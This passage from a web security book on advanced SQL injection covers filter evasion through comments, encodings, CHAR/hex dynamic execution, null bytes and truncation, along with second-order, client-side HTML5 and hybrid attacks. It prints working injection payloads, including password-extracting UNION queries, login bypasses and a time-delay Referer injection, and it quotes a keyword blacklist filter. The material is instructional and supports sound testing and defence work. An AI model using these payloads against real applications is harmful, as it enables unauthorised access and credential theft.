\nattempt to prevent SQL injection attack s: \nif (stristr($value,‘FROM ’) ||stristr($value,‘UPDATE ’) ||  \nstristr($value,‘WHERE ’) ||  \nstristr($value,‘ALTER ’) ||  \nstristr($value,‘SELECT ’) ||  \nstristr($value,‘SHUTDOWN ’) ||  \nstristr($value,‘CREATE ’) ||  \nstristr($value,‘DROP ’) ||  \nstristr($value,‘DELETE FROM ’) ||  \nstristr($value,‘script’) ||  \nstristr($value,‘<>’) ||  \nstristr($value,‘=’) ||  \nstristr($value,‘SET ’))die(‘Please provide a permitted value for ’.$key);  \nNote the space following each SQL keyword that is being checked for. You can easily \nbypass this filter using inline comments to separate each keyword without the need for whitespace. For example:  \n‘/∗∗/UNION/∗∗/SELECT/∗∗ /password/∗∗ /FROM/∗∗/tblUsers/∗∗/WHERE/∗∗ /username/∗∗ /LIKE/∗∗/ ‘admin’-- \n(Note that the equals character (=), w hich is also being filtered, has been replaced with the \nLIKE  keyword in this bypass attack, which in this instance achieves the same result.)  \nOf course, you can use this same technique to bypass filters which simply block any \nwhitespace whatsoever. Many developers wrongly believe that by restricting input to a single \ntoken they are preventing SQL injection attacks, forgetting that inline comments enable an attacker to construct arbitrarily complex SQL without using any spaces.  \nIn the case of MySQL, you can even use inline comments within SQL keywords, enabling \nmany common keyword- blocking filters to be circumvented. For example, if you modified the \ndefective phpShop filter to check for the keywords only and not for the additional whitespace, the following at tack will still work if the back -end database is MySQL:  \n‘/∗∗/UN/∗∗ /ION/∗∗/SEL/∗∗ /ECT/∗∗/password/∗∗/FR/∗∗ /OM/∗∗/tblUsers/∗∗/WHE/∗∗ /RE/∗∗/username/∗∗/LI\nKE/∗∗/‘admin’-- \nUsing URL Encoding  \nURL encoding is a versatile technique that you can use to defeat many kinds of input filters. In its most basic form, this involves replacing problematic characters with their ASCII code in hexadecimal form, preceded by the % character. For example, the ASCII code for a single quotation mark is 0x27, so its URL -encoded repre sentation is %27. \nA vulnerability discovered in 2007 in the PHP -Nuke application (see \nhttp://secunia.com/advisories/24949/ ) employed a filter which blocked both whitespace and the \ninline comment sequence  /∗, but failed to block the URL -encoded representation  of the \ncomment sequence. In this situation, you can use an attack such as the following to bypass the filter: \n‘%2f%2a∗ /UNION%2f%2a∗ /SELECT%2f%2a∗ /password%2f%2a∗ /FROM%2f%2a∗ /tblUsers%2f%2a∗ /WHERE%2f%2a ∗/\nusername%2f%2a ∗/LIKE%2f%2a∗ /‘admin’-- \nIn other cases, this basic URL -encoding attack does not work, but you can nevertheless \ncircumvent the filter by double -URL encoding the blocked characters. In the double -encoded \nattack, the % character in the origin al attack is itself URL -encoded in the normal way (as %25) \nso that the double -URL -encoded form of a single quotation mark is %2527. If you modify the \npreceding attack to use double -URL encoding, it looks like this:  \n‘%252f%252a∗ /UNION%252f%252a∗ /SELECT%252f%252a∗ /password%252f%252a∗ /FROM%252f%252a∗ /tblUsers%\n252f%252a∗ /WHERE%252f%252a∗ /username%252f%252a∗ /LIKE%252f%252a∗ /‘admin’-- \nDouble -URL encoding sometimes works because Web applications sometimes decode user \ninput more than once, and apply their input fil ters before the final decoding step. In the \npreceding example, the steps involved are as follows:  \n1 The attacker supplies the input ‘%252f%252a ∗/UNION …  \n2 The application URL decodes the input as ‘%2f%2a ∗/ UNION … \n3 The application validates that the input does not contain / ∗ (which it doesn’t). \n4 The application URL decodes the input as ‘/ ∗∗/ UNION … \n5 The application processes the input within an SQL query, and the attack is successful.  \nA further variation on the URL -encoding technique is to use Unicode enc odings of blocked \ncharacters. As well as using the % character with a two -digit hexadecimal ASCII code, URL \nencoding can employ various Unicode representations of characters. Further, because of the \ncomplexity of the Unicode specification, decoders often t olerate illegal encodings and decode \nthem on a “closest fit” basis. If an application’s input validation checks for certain literal and Unicode -encoded strings, it may be possible to submit illegal encodings of blocked characters, \nwhich will be accepted by  the input filter but which will decode appropriately to deliver a \nsuccessful attack.  \nTable 7.1 shows various standard and non- standard Unicode encodings of characters that are \noften useful when performing SQL injecti on attacks. \n \nUsing Dynamic Query Execution  \nMany databases allow SQL queries to be executed dynamically, by passing a string containing \nan SQL query into a database function which executes the query. I f you have discovered a \n\nvalid SQL injection point, but find that the application’s input filters are blocking queries you \nwant to inject, you may be able to use dynamic execution to circumvent the filters.  \nDynamic query execution works differently on diffe rent databases. On Microsoft SQL \nServer, you can use the EXEC  function to execute a query in string form. For example:  \nEXEC(‘SELECT password FROM tblUsers’)  \nIn Oracle, you can use the EXECUTE IMMEDIATE command to execute a query in string \nform. For example : \nDECLARE pw VARCHAR2(1000);  \nBEGINEXECUTE IMMEDIATE ‘SELECT password FROM tblUsers’ INTO pw;  \nDBMS_OUTPUT.PUT_LINE(pw);  \nEND; \nDatabases provide various means of manipulating strings, and the key to using dynamic \nexecution to defeat input filters is to use th e string manipulation functions to convert input that \nis allowed by the filters into a string which contains your desired query.  \nIn the simplest case, you can use string concatenation to construct a string from smaller \nparts. Different databases use differ ent syntax for string concatenation. For example, if the \nSQL keyword SELECT  is blocked, you can construct it as follows:  \nOracle: ‘SEL’||‘ECT’  \nMS-SQL: ‘SEL’+‘ECT’  \nMySQL: ‘SEL’‘ECT’  \nNote that SQL Server uses a + character for concatenation, whereas MySQL uses a space. If \nyou are submitting these characters in an HTTP request, you will need to URL -encode them as \n%2b and %20, respectively.  \nGoing further, you can construct individual characters using the CHAR  function ( CHR  in \nOracle) using their ASCII character code. For example, to construct the SELECT  keyword on \nSQL Server, you can use:  \nCHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)  \nNote that you can construct strings in this way without using any quotation mark characters. \nIf you have an SQL injection e ntry point where quotation marks are blocked, you can use the \nCHAR  function to place strings (such as ‘admin’ ) into your exploits.  \nOther string manipulation functions may be useful as well. For example, Oracle includes the \nfunctions REVERSE, TRANSLATE, REPLACE, and SUBSTR . \nAnother way to construct strings for dynamic execution on the SQL Server platform is to \ninstantiate a string from a single hexadecimal number which represents the string’s ASCII \ncharacter codes. For example, the string:  \nSELECT password FR OM tblUsers  \ncan be constructed and dynamically executed as follows:  \nDECLARE @query VARCHAR(100)  \nSELECT @query = 0x53454c4543542070617373776f72642046524f4d2074626c5573657273  \nEXEC(@query)  \nThe mass SQL injection attacks against Web applications that started in early 2008 \nemployed this technique to reduce the chance of their exploit code being blocked by input filters in the applications being attacked.  \nUsing Null Bytes  \nOften, the input filte rs which you need to bypass in order to exploit a SQL injection \nvulnerability are implemented outside the application’s own code, in intrusion detection systems (IDSs) or WAFs. For performance reasons, these components are typically written in native code languages, such as C++. In this situation, you can often use null byte attacks to circumvent input filters and smuggle your exploits into the back- end application. \nNull byte attacks work due to the different ways that null bytes are handled in native and \nmanaged code. In native code, the length of a string is determined by the position of the first \nnull byte from the start of the string —the null byte effectively terminates the string. In \nmanaged code, on the other hand, string objects comprise a character a rray (which may contain \nnull bytes) and a separate record of the string’s length.  \nThis difference means that when the native filter processes your input, it may stop \nprocessing the input when it encounters a null byte, because this denotes the end of the s tring \nas far as the filter is concerned. If the input prior to the null byte is benign, the filter will not \nblock the input. However, when the same input is processed by the application, in a managed code context, the full input following the null byte wil l be processed, allowing your exploit to \nbe executed.  \nTo perform a null byte attack, you simply need to supply a URL -encoded null byte (%00) \nprior to any characters that the filter is blocking. In the original example, you may be able to circumvent native input filters using an attack string such as the following:  \n%00’ UNION SELECT password FROM tblUsers WHERE username=‘admin’--  \nNesting Stripped Expressions  \nSome sanitizing filters strip certain characters or expressions from user input, and then process the remaining data in the usual way. If an expression that is being stripped contains two or more characters, and the filter is not applied recursively, you c an normally defeat the filter by \nnesting the banned expression inside itself.  \nFor example, if the SQL keyword SELECT  is being stripped from your input, you can use \nthe following input to defeat the filter:  \nSELSELECTECT  \nExploiting Truncation  \nSanitizing filters often perform several operations on user -supplied data, and occasionally one \nof the steps is to truncate the input to a maximum length, perhaps in an effort to prevent buffer overflow attacks, or accommodate data within database fields that have a pred efined maximum \nlength.  \nConsider a login function which performs the following SQL query, incorporating two items \nof user -supplied input:  \nSELECT uid FROM tblUsers WHERE username = ‘jlo’ AND password = ‘r1Mj06’  \nSuppose the application employs a sanitizing fi lter, which performs the following steps:  \n1 Doubles up quotation marks, replacing each instance of a single quote (‘) with two single \nquotes (”).  \n2 Truncates each item to 16 characters.  \nIf you supply a typical SQL injection attack vector such as:  \nadmin’-- \nthe following query will be executed, and your attack will fail:  \nSELECT uid FROM tblUsers WHERE username = ‘admin’’--’ AND password = ’’  \nNote that the doubled- up quotes mean that your input fails to terminate the username string, \nand so the query actually checks for a user with the literal username you supplied.  \nHowever, if you instead supply the username:  \naaaaaaaaaaaaaaa’  \nwhich contains 15 a’s and one quotation mark, the application first doubles up the quote, \nresulting in a 17 -character string, and then r emoves the additional quote by truncating to 16 \ncharacters. This enables you to smuggle an unescaped quotation mark into the query, thus interfering with its syntax:  \nSELECT uid FROM tblUsers WHERE username = ‘aaaaaaaaaaaaaaa’’AND password = ’’  \nThis initial attack results in an error, because you effectively have an unterminated string: \neach pair of quotes following the a’s represents an escaped quote, and there is no final quote to delimit the username string. However, because you have a second insertion point, in the password field, you can restore the syntactic validity of the query, and bypass the login, by also supplying the following password:  \nor 1=1-- \nThis causes the application to perform the following query:  \nSELECT uid FROM tblUsers WHERE  username = ‘aaaaaaaaaaaaaaa’’ AND password = ’or 1=1--’  \nWhen the database executes this query, it checks for table entries where the literal username \nis: \naaaaaaaaaaaaaaa’ AND password =  \nwhich is presumably always false, or where 1  = 1, which is always tru e. Hence, the query will \nreturn the UID of every user in the table, typically causing the application to log you in as the \nfirst user in the table. To log in as a specific user (e.g. with UID 0), you would supply a password such as the following:  \nor uid=0- - \nNotes from the underground…  \nOther Truncation Attacks  \nTruncation of user -supplied input in SQL queries can lead to vulnerabilities even when pure SQL injection is not \npossible. In Microsoft SQL Server, parameterized queries must specify a maximum length f or each string \nparameter, and if longer input is assigned to the parameter it is truncated to this length. Furthermore, SQL Server \nignores trailing whitespace when comparing strings within a WHERE  clause. These features can lead to a range of \nproblems in vulnerable applications. For example, suppose an application allows users who have forgotten their \npassword to submit their e -mail address and receive their forgotten password via e -mail. If the application accepts \noverly long input which gets truncated wit hin the SQL query, an attacker can submit the following input:  \nvictim@example.org  [many spaces]; evil@attacker.org  \nIn the resultant query, this input will retrieve the passw ord for victim@example.org , because the trailing \nwhitespace in the truncated input is ignored: \nSELECT password FROM tblUsers WHERE e -mail = ‘victim@example.org ’ \nWhen the ap plication then sends the password to the originally supplied e -mail address, a copy is also sent to \nthe attacker, enabling him to compromise the victim’s account. For further details of this and similar attacks, see \nthe paper “Buffer Truncation Abuse in .N ET and Microsoft SQL Server,” written by Gary O’Leary -Steele and \navailable at www.scoobygang.org/HiDDenWarez/bta.pdf . \nBypassing Custom Filters  \nWeb applications are extremely varied, and you are likely to encounter all kinds of weird and wonderful input filters in the wild. You frequently can bypass these filters with a little imagination.  \nOracle Application Server provides a useful case study in poorly devised custom filters. This \nproduct provide s a Web interface to database procedures, enabling developers to quickly \ndeploy a Web application based on functionality that is already implemented within a database. \nTo prevent attackers from leveraging the server to  access the powerful procedures that are built \ninto the Oracle database, the server implements an exclusion list, and blocks access to packages such as SYS and OWA.  \nBlacklist- based filters of this kind are, of course, notoriously susceptible to bypasses, and \nOracle’s exclusion list is no exception. In the early 2000s, David Litchfield discovered a series of defects in the filter, each involving ways of representing bl ocked packages that appear \nbenign to the front -end filter but are still processed as intended by the back -end database.  \nFor instance, whitespace can be placed before the package name:  \nhttps://www.example.com/pls/dad/%0ASYS.package.procedure  \nThe Y character in SYS can be replaced with a URL -encoded ÿ character:  \nhttps://www.example.com/pls/dad/S%FFS.package.procedure  \nThe package name can be placed within quotation marks:  \nhttps://www.example.com/pls/dad/“SYS”.package.procedure  \nA programming goto label can be placed before the package name:  \nhttps://www.example.com/pls/dad/<<FOO>>SYS.package.procedure  \nAlthough these examples are specific to a particular product, they illustrate the kinds of \nissues that can arise with custom input f ilters, and the techniques that you need to try when \nattempting to circumvent them.  \nUsing Non -Standard Entry Points  \nSometimes you will encounter situations where application -wide defenses are in place (such as \nWAFs) which implement effective input filters and prevent the usual means of exploiting vulnerable code. In this situation, you should look for non- standard entry points into the \napplication, which may be vulnerable to SQL injection and which the application- wide filters \nmay have overlooked.  \nMany WAFs  inspect the values of every request parameter, but do not validate the \nparameter names. You can, of course, add arbitrary parameter names to any request. If the \napplication incorporates arbitrary parameter names into dynamic SQL queries, you may be able t o perform SQL injection despite the presence of the filter.  \nConsider an application function which saves user preferences. The preferences page has a \nlarge number of input fields, which are submitted to a URL such as the following:  \nhttps://www.example.org/Preferences.aspx?lang=en&region=uk&currency=gbp…  \nRequesting this URL causes the application to make a number of SQL queries of the form:  \nUPDATE profile SET lang=‘en’ WHERE UID=2104  \nUPDATE profile SET region=‘uk’ WHERE UID=2104  \nUPDATE profile SET currency=‘gbp’ WHERE UID=2104  \n… \nBecause the fields used for preferences change over time, the developers decided to take a \nshortcut and implemented the functionality as follows:  \nIEnumerator i = Request.QueryString.GetEnumerator();  \nwhile (i.MoveNext())  \n{string name = (string)i.Current;  \nstring query = “UPDATE profile SET ” + name + “=‘‘‘+ Request.QueryString[name].Replace(“’”, \n“’’”) +  \n’’’ WHERE uid=” + uid;  \n… \n} \nThis code enumerates all of the parameters supplied in the querystring, and builds a SQL \nquery using each one. Although quotation marks in parameter values are being escaped, in an attempt to block SQL injection attacks, the parameter values are embedded d irectly into the \nquery without any filtering. Hence, the application is vulnerable, but only if you place your \nattack into a parameter name.  \nA similar vulnerability can arise if the application contains a custom logging mechanism \nwhich saves to the databas e all requested URLs, including the querystring. If the input filters \nvalidate parameter values but not parameter names, you can place payloads into a parameter name to exploit the vulnerability.  \nAnother entry point which application- wide input filters typ ically overlook is the headers \nwithin HTTP requests. Application code can process HTTP headers in arbitrary ways, and applications frequently process headers such as Host, Referer, and User -Agent in application-\nlevel logging mechanisms. If the values of re quest headers are incorporated into SQL queries \nin an unsafe manner, you may be able to perform a SQL injection by attacking these entry points. \nNotes from the underground…  \nInjection Via Search Query Referers  \nIn addition to custom mechanisms for logging re quests, many applications perform traffic analysis functions, \nproviding administrators with data regarding the navigational paths followed by users within the application, and \nthe external sources from which users arrive at the application. This analysis u sually includes information about \nthe search queries performed by users which led them to the application. To determine the terms used in these \nqueries, applications check the Referer header looking for the domain names of popular search engines, and then \nparse out the search term from the relevant parameter in the Referer URL. If these terms are incorporated into \nSQL queries in an unsafe manner, you can perform SQL injection by embedding your attack in the query \nparameter of a search URL, and submitting th is within the Referer header. For example:  \nGET /vuln.aspx HTTP/1.1  \nHost:www.example.org  \nReferer: http://www.google.com/search?hl=en&q=a’;+waitfor+  \ndelay+‘0:0:30’--  \nThis kind of attack vector is pretty obscure, and is likely to be missed by many penetration testers and \nautomated scanners (except for Burp Scanner, which checks for this attack against every request scanned).  \nExploiting second -order SQL injection  \nVirtually every instance of SQL injection discussed in this book so far may be classified as \n“first -order” SQL injection. This is because the events involved all occur within a single HTTP \nrequest and response, as follows:  \n1 The attacker submits some crafted input in an HTTP request.  \n2 The application processes the input, causing the attacker’s injected SQL query to execute.  \n3 If applicable, the results of the query are returned to the attacker in the application’s response \nto the request.  \nA diffe rent type of SQL injection attack is “second -order” SQL injection. Here, the \nsequence of events is typically as follows:  \n1 The attacker submits some crafted input in an HTTP request.  \n2 The application stores that input for future use (usually in the database), and responds to the \nrequest.  \n3 The attacker submits a second (different) request.  \n4 To handle the second request, the application retrieves the stored input and processes it, \ncausi ng the attacker’s injected SQL query to execute.  \n5 If applicable, the results of the query are returned to the attacker in the application’s response \nto the second request. \nSecond -order SQL injection is just as powerful as the first -order equivalent; however, it is a \nsubtler vulnerability which is generally more difficult to detect.  \nSecond -order SQL injection usually arises because of an easy mistake that developers make \nwhen thinking about tainted and validated data. At the point where input is received di rectly \nfrom users, it is clear that this input is potentially tainted, and so clued -in developers will make \nsome efforts to defend against first -order SQL injection, such as doubling up single quotes or \n(preferably) using parameterized queries. However, if  this input is persisted and later reused, it \nmay be less obvious that the data are still tainted, and some developers make the mistake of \nhandling the data unsafely at this point. \nConsider an address book application which allows users to store contact information about \ntheir friends. When creating a contact, the user can enter details such as name, e- mail, and \naddress. The application uses an INSERT  statement to create a new database entry for the \ncontact, and doubles up any quotation marks in the input t o prevent SQL injection attacks (see \nFigure 7.1).  \n \nFigure 7.1  The Fl ow of Information When a New Contact is Created  \nThe application also allows users to modify selected details about an existing contact. When \na user modifies an existing contact, the application first uses a SELECT  statement to retrieve \nthe current details about the contact, and holds the details in memory. It then updates the \nrelevant items with the new details provided by the user, again doubling up any quotation marks in this input. Items which the user has not updated are left unchanged in memory. The application then uses an UPDATE  statement to write all of the in -memory items back to the \ndatabase (see Figure 7.2 ). \n \nFigure 7.2  The Flow of Information When an Existing Contact is Updated  \nLet’s assume that the doubling up of quotation marks in this instance is effective in \npreventing  first-order SQL injection. Nevertheless, the application is still vulnerable to second -\norder attacks. To exploit the vulnerability, you first need to create a contact with your attack payload in one of the fields. Assuming the database is Microsoft SQL Se rver, create a contact \nwith the following name:  \na‘+@@version+’a  \n\nThe quotes are doubled up in your input, and the resultant INSERT  statement looks like this:  \nINSERT INTO tblContacts VALUES (‘a‘‘+@@version+’’a’, ‘ foo@example.org’,…  \nHence, the contact name is safely stored in the database, with the literal value that you \nsubmitted.  \nThen, you need to go to the function to update the new contact, and provide a new value in \nthe address field only (any accepted value will do) . When you do this, the application will first \nretrieve the existing contact details, using the following statement:  \nSELECT ∗ FROM tblUsers WHERE contactId = 123  \nThe retrieved details are stored briefly in memory. The value retrieved for the name field \nwill, of course, be the literal value that you originally submitted, because this is what was \nstored in the database. The application replaces the retrieved address in memory with the new \nvalue you supplied, taking care to double up quotation marks. It then performs the following UPDATE  statement to store the new information in the database:  \nUPDATE tblUsers  \nSET name=‘a’+@@version+‘a’, address=‘52 Throwley Way’,…  \nWHERE contactId = 123  \nAt this point, your attack is successful and the application’s query is subve rted. The name \nretrieved from the database is handled unsafely, and you are able to break out of the data context within the query and modify the query’s structure. In this proof -of-concept attack, the \ndatabase version string is copied into the name of your contact, and will be displayed on -screen \nwhen you view the updated contact details:  \nName: aMicrosoft SQL Server 7.00 –  7.00.623 (Intel X86) Nov 27 199822:20:07 Copyright (c) \n1988–1998 Microsoft Corporation Desktop  \nEdition on Windows NT 5.1 (Build 2600:)a  \nAddress: 52 Throwley Way  \nTo perform a more effective attack, you would need to use the general techniques already \ndescribed for injecting into UPDATE  statements (see Chapter 4 ), again placing your attacks \ninto one contact field and then updating a different field to trigger the vulnerability.  \nFinding Second-Order Vulnerabilities  \nSecond -order SQL injection is more difficult to detect than first- order vulnerabilities, because \nyour exploit is submitted in one request and executed in the application’s handling of a \ndifferent request. The core technique for discovering most input -based vulnerabilities, where \nan individual request is submitted repeatedly with various crafted inputs and the application’s \nresponses are monitored for anomalies, is not effective in this instance. Rather, you need to submit your crafted input in one request, and then step through all other application functions which may make use of that input, looking for anomalies. In some cases, there is only one \ninstance of the relevant input (e.g. the user’s display name), and testing each payload may necessitate stepping through the application’s entire functionality.  \nToday’s automated scanners are not very effective at discovering second -order SQL \ninjection. They typically submit each request numerous times with different inputs, and monitor the responses. If they then crawl other areas of the application and encounter database error messages, they will draw your atten tion to them, hopefully enabling you to investigate \nand diagnose the issue. But they are not capable of associating an error message returned in one location with a piece of crafted input submitted in another. In some cases, there is no error message, and the effects of the second- order condition may be handled blindly. If there is only \na single instance of the relevant persisted item, or persisting it within the application requires multiple steps (e.g. a user registration process), the problem is compounded further. Hence, today’s scanners are not able to perform a rigorous methodology for discovering second -order \nvulnerabilities.  \nWithout an understanding of the meaning and usage of data items within the application, the \nwork involved in detecting second -order SQL injection grows exponentially with the size of \nthe application’s functionality. But human testers can use their understanding of that functionality, and their intuition about where mistakes are often made, to reduce the size of the task. In most c ases, you can use the following methodology to identify second- order \nvulnerabilities: \n1 After you have mapped out the application’s content and functionality, review it, looking for \nany items of user -controllable data that are persisted by the application and reused in \nsubsequent functions. Work on each item individually, and perform the following steps on \neach instance.  \n2 Submit a simple value within the item that is likely to cause problems if used unsafely in a \nSQL query, such as a single quote or an alphanumeric string with a single quote within it. If required, walk through any multistage processes (such as user registration) to ensure that your value is fully persisted within the application.  \n3 If you find that the application’s input filters block you r input, use the techniques described \nearlier in this chapter (in “Evading Input Filters”) to try to defeat the front -end input filters. \n4 Walk through all of the application’s functionality where you have seen the data item being \nexplicitly used, and also any functions where it might conceivably be implicitly used. Look \nfor any anomalous behavior that may indicate that the input has caused a problem, such as database error messages, HTTP 500 status codes, more cryptic error messages, broken functionality, missing or corrupted data, and so forth. \n5 For each potential issue identified, try to develop a proof -of-concept attack to verify that a \nSQL injection vulnerability is present. Be aware that malformed persisted data may cause anomalous conditions in ways that are not directly vulnerable (e.g. integer conversion errors, or failure of subsequent data validation). Try supplying the same input with two quotation \nmarks together, and see whether the anomaly goes away. Try using database -specific \nconstructs such as string concatenation functions and version banners to confirm that you are modifying a SQL query. If the anomalous condition is blind (i.e. it does not return the results of the query or any error message), try using time delay techniques to verify that  a \nvulnerability is present.  \nYou should be aware that some second -order SQL injection vulnerabilities are fully blind \nand have no discernible effects on the contents of any application responses. For example, if an application function writes persisted dat a to logs in an unsafe manner, and handles any \nexceptions gracefully, the steps I just described will probably miss the vulnerability. To detect these kinds of flaws, you need to repeat the preceding steps using various inputs in step 1 designed to trigger  time delays when used unsafely in SQL queries, and then monitor all of the \napplication’s functionality for anomalous delays. To do this effectively, you will need to use syntax that is specific  to the type of database being used and the types of queries ( SELECT , \nINSERT , etc.) being performed. In practice, this may be a very lengthy exercise indeed.  \nTools & traps… \nWhy Second -Order Bugs Happen  \nSecond -order SQL injection is surprisingly common. The authors have encountered this vulnerability in mature, \nsecuri ty-critical applications such as those used by online banks. Bugs such as this can go unnoticed for years, \nbecause of the relative difficulty of detecting them.  \nMany, perhaps even most, developers these days have some awareness of SQL injection threats, an d they \nknow how to use parameterized queries to safely incorporate tainted data into SQL queries. However, they also \nknow that writing parameterized queries involves a little more effort than constructing simple dynamic queries. \nMany also have in mind a mi staken concept of taint, in which user -supplied data needs to be handled safely on \narrival, but can then be treated as trusted.  \nA very common approach to coding SQL queries is to use parameterized queries for data that are most \nobviously tainted, such as t hat which is received from the immediate HTTP request, and elsewhere to make a \njudgment in each case as to whether the data are safe to use in a dynamic query. This approach is dangerous. It \ncan easily lead to oversights, where tainted data are handled uns afely by mistake. Data sources that are \ntrustworthy may become tainted at a future time due to changes elsewhere in the code base, unwittingly \nintroducing second -order vulnerabilities. And the mistaken concept of taint, where data need to be handled safely  \nonly on arrival, can lead to items appearing to be trustworthy when they are not.  \nThe most robust way to defend against second- order vulnerabilities is to use parameterized queries for all \ndatabase access, and to properly parameterize every variable data item which is incorporated into the query. This \napproach incurs a small amount of superfluous effort for data which are genuinely trustworthy, but it will avoid \nthe mistakes described. Adopting this policy also makes security review of code quicker and eas ier in relation to \nSQL injection.  \nNote that some parts of SQL queries, such as column and table names, cannot be parameterized, because they \nconstitute the structure which is fixed when the query is defined, before data items are assigned to their \nplacehol ders. If you are incorporating user -supplied data into these parts of the query, you should determine \nwhether your functionality can be implemented in a different way; for example, by passing index numbers which \nare mapped to table and column names server -side. If this is not possible, you should carefully validate the user \ndata on a whitelist basis, prior to use.  \n \n \nExploiting client -side SQL injection  \nHTML5 has introduced a wide range of new features and functionality, many of which create \npossibilities for new attack and defensive techniques. In relation to SQL injection, the most relevant feature of HTML5 is the new mechanisms it introduces for client -side data storage.  \nIn HTML5, client -side JavaScript code can use local SQL -based databases to store and \nretrieve arbitrary data. This enables applications to persist long -term data on the client side for \nfaster retrieval, and even to work in “offline mode ” when no connection to the server is \navailable.  \nAccessing Local Databases  \nHere is an example of some JavaScript code that opens a local database, creates a table, and updates it with some data: \nvar database = openDatabase(“dbStatus”, “1.0”, “Status updates”, 500000);  \ndb.transaction(function(tx) {  \ntx.executeSql(“CREATE TABLE IF NOT EXISTS tblUpdates (id INTEGER NOT NULL PRIMARY KEY \nAUTOINCREMENT, date VARCHAR(20), user VARCHAR(50), status VARCHAR(100))”);  \ntx.executeSql(“INSERT INTO tblUpdates (date, user, status) VALUES (‘1/8/2012’, ‘Me’, ‘I am \nwriting a book.’)”);  \n}); \nThis simple script first opens a database called dbStatus. The call to openDatabase specifies \nthe name of the database, its version number (to allow future versions of the application to work with different legacy versions of the database), a display name for the database, and its \nmaximum size in bytes. If the database does not already exist, it will be automatically created. The script then executes some standard SQL to create a table (unless it already exists), and insert a row into this table.  \nIn this example, the database is being used by a social networking application to store status \nupdates for the user and his contacts. Storing this information in the client -side database \nenables the app lication to quickly access this data without needing to retrieve it from the \nserver. It also enables the user to update their status while offline with no Internet connection, \nand the application will later synchronize any offline status updates with the s erver when a \nconnection is available.  \nSome other examples of where offline data storage can be effective in Web applications \ninclude:  \n• News applications —headlines and article text can be streamed in the background and stored \nlocally, enabling the user to quickly view preloaded articles and read content offline. User \ncomments can also be stored locally, and uploaded to the server asynchronously.  \n• Banking applications —transaction information can be stored locally, allowing the user to \nview it offline.  \n• Web  mail applications —e-mail messages can be stored in the local database for fast retrieval \nand offline viewing. Outgoing messages can be stored locally and sent later. \nMany of the possibilities provided by local SQL storage are particularly useful in mobile  \napplications, where the available Internet connection may be intermittent, have low bandwidth, high latency, or other performance problems. Using offline databases combined with asynchronous data synchronization allows applications to provide a much riche r user \nexperience in these situations.  \nAttacking Client -Side Databases \nAs we have discussed throughout this book, SQL injection vulnerabilities arise where attacker -\ncontrolled data are inserted into a SQL query in an unsafe way. And if client -side JavaScri pt-\nbased applications access local SQL databases using attacker -controlled data in an unsafe way, \nthen exactly the same kind of vulnerabilities can arise. The primary differences are the channel via which the attack must be delivered, and the available mec hanisms for extracting captured \ndata.  \nTo deliver a client -side SQL injection attack, the attacker must identify some piece of data \nwhich he controls and which the application stores in an unsafe way in the client -side \ndatabases of other users. In the preceding example, the social networking application used a local SQL database to store the status updates of the current user and his contacts. Hence, data submitted by one user in a status update are propagated, via the server, to the local databases of other  users. If this data are not sanitized by the application, and are inserted directly into the \nclient -side SQL query, then the client -side application is probably vulnerable:  \ntx.executeSql(“INSERT INTO tblUpdates (date, user, status) VALUES (‘1/8/2012’, ‘Ba d Guy’, \n’’’)”); // causes a SQL error due to unbalanced quotes  \nWhat is noteworthy here is that the data may be handled safely by the application in all \nserver -side operations, including SQL queries. The server -side parts of the application may \nwell be more  mature and more fully tested, and so free from any SQL injection problems. If \nthe client -side parts of the application have been developed without consideration for the SQL \ninjection issues that can arise, then these may yet be vulnerable.  \nThe types of at tacks that are feasible with client -side SQL injection depend upon exactly \nhow the local database is used within the application. These attacks are  obviously “blind” in \nthe sense that the results of queries are not returned directly to the attacker. Hence,  for \nexample, an attack like ‘ or 1=1--  against a SELECT query will not return any information \ndirectly to the attacker. Further, common techniques for dealing with blind SQL injection \nconditions do not apply, since there is generally no way for an attacke r to identify when an \nerror, time delay, or other anomaly has occurred.  \nHowever, the attacks are also “non -blind” in the sense that the attacker has his/her own \ninstance of the client -side application that he/she can fully interact with in a white -box cont ext. \nHe/she can use this to determine exactly what SQL queries are being performed, what filtering or other defenses are in place, and then fine -tune an attack before delivering it to an actual \nvictim.  \nAssuming that no other relevant vulnerabilities exist within the client- side code (such as \ninjection of dynamically executed JavaScript), exploitation of a client- side SQL injection \nvulnerability must occur solely within the injected SQL —for example, by using injected sub -\nqueries to select data from one table and inject them into another. The attack will often also \ndepend upon the application’s own mechanisms for offline data synchronization to push the captured data up to the server, and thereby back to the attacker. Some examples of successful exploitation o f a client -side SQL injection vulnerability, using pure SQL to deliver the attack, \ninclude the following:  \n• In a social networking application, the attacker might be able to use injected SQL to retrieve \nsensitive information from the local database (for example, the contents of a private message), and copy this into the user’s current status where it can then be  viewed in the \nnormal way.  \n• In a Web mail application, the attacker might be able to retrieve the contents of messages in \nthe user’s inbox, and copy these into a new entry in the outgoing messages table, resulting in \nan e- mail to the attacker containing the compromised data.  \n• In an auction application, the attacker might be able to use a crafted comment to perform \nSQL injection on any user viewing the comment, causing them to place an (offline) bid on an item of the attacker’s choosing.  \nIn the typical use -cases for client -side SQL storage, it is likely that free -form text data \nsubmitted by regular users of the application will be expected to contain quotation marks and other SQL meta characters —for example, the social networking application presumably must  \nsupport status messages containing single quotes. Hence, it is likely that the most obvious SQL injection vulnerabilities will be identified in the course of normal usability testing of the application. For this reason, the most fruitful areas to look for  client -side SQL injection \nvulnerabilities are likely to be in: \n• Text -based data that can be controlled by the attacker but which are not originally input to \nthe application in free -form on- screen text fields —for example, data submitted via hidden \nform fi elds, drop- down lists, etc. \n• Data that are entered on -screen but which are subject to input validation routines, designed to \nsanitize SQL meta characters (for example, doubling -up quotation marks), which can be \ncircumvented in some way.  \nUsing hybrid attac ks \nHybrid attacks combine two or more exploits to attack an application, often resulting in a compromise that is greater than the sum of its parts. You can combine a SQL injection with other techniques in numerous ways to achieve your objectives in attacki ng an application.  \nLeveraging Captured Data \nFirst, of course, you can use SQL injection to retrieve sensitive data that you can use to escalate your privileges within the application. For example, you may be able to read the passwords for other users, and log in as them. If the passwords are hashed and you know the algorithm, you can try to crack the captured hashes offline. Similarly, you may be able to read tables of sensitive logging data, containing usernames, session tokens, or even the parameters subm itted in the requests of other users.  \nMore elaborately, if the application contains an account recovery function which e -mails a \none-time recovery URL to users who have forgotten their password, you may be able to read \nthe values of the account recovery tokens issued to other users, and so initiate account recovery \nfor arbitrary users and thereby compromise their accounts.  \nCreating Cross -Site Scripting  \nSQL injection is a great bug to find in a Web application, but sometimes you may really want a different b ug, such as cross -site scripting (XSS). Often, you can use SQL injection \nvulnerabilities to introduce different kinds of XSS into the application. \nIf the input which you supply to the application is not itself being echoed 